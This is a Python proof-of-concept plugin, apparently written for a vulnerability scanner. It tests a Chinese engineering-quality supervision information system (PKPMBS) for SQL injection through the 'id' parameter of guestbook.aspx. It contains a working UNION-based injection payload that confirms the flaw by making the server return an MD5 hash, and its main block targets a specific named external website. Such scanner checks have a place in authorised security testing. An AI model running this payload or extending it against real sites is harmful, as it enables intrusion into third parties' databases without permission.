#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PKPMBS工程质量监督站信息管理系统SQL注入
author: Lucifer
referer: http://www.wooyun.org/bugs/wooyun-2015-0150084
description: 链接guestbook.aspx中参数id未过滤存在SQL注入漏洞
'''

import re

def assign(service, arg):
    if service == "pkpmbs":
        return True, arg

def audit(arg):
    url = arg + "guestbook.aspx?do=show&id=1%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null,null,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole('sql inj :'+url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('pkpmbs', 'http://www.ccjdw.com/')[1])